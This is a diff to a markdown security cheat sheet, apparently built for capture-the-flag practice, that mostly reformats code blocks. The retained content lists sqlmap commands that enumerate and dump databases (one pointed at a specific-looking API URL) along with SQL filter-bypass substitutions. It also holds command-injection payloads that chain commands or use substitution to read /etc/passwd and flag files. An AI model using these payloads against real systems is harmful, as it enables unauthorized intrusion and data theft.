@@ -277,12 +277,12 @@ add stuff here
 ```
 
 Sqlmap:
-```bash
-#Enumerate everything:
-$ python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap -a --level=3
+```shell
+# Enumerate everything:
+python sqlmap.py -u https://internship.dev.ns.agency/secret/api/to/get/jobs/?company=sap -a --level=3
 
-#Enumerate a specific database:
-$ python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
+# Enumerate a specific database:
+python sqlmap.py -u [ example.com/?id=1234 ] --dump -D [ database_name ] --level=3
 ```
 
 Other things:
@@ -295,8 +295,6 @@ Logic Altneratives (bypass filters etc.)
    or -> ||
    = -> like
    != -> not like
-   
-
 ```
 
 ---
@@ -305,13 +303,13 @@ Logic Altneratives (bypass filters etc.)
 
 **Command Injection**
 Examples:
-```html
+```
 http://shitesite/lol.php?path=cat%20/etc/passwd
 http://roflblock/cgi-bin/userData.pl?doc=/bin/ls|
 ```  
 
 Injection via. chaining:  
-```bash
+```shell
 {original_cmd_by_server}; cat flag
 {original_cmd_by_server} && cat flag
 {original_cmd_by_server} | cat flag
@@ -323,7 +321,7 @@ Injection via. chaining:
 {original_cmd_by_server} "; cat $(ls)
 ```  
 Execution inside another command:  
-```bash
+```shell
 original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
 ```  
